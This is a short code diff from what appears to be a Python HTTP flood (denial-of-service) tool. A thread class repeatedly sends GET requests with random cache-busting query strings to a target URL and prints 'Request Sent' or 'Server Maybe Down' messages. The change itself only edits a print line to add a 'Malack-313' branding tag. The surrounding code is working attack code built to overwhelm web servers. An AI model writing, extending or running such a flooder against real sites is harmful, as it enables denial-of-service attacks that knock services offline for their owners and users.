@@ -70,7 +70,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 0
-                print("[⟨⟩]\033[31m▒\033[31m " +str(u)+ "▒\033[37m Request Sent ▒\033[33m " +url+ "▒=⟩\033[0m" )      
+                print("[⟨⟩]\033[31m▒\033[31mMalack-313▒\033[37m Request Sent ▒\033[33m " +str(url)+ "▒=⟩\033[0m" )      
             except requests.exceptions.ConnectionError:
                 print("▒ ▒ ▒ \033[1mServer \033[4mMaybe\033[97m ▒ ▒ ▒ \033[35mDown ▒ ▒ \033[0m" )
                 pass
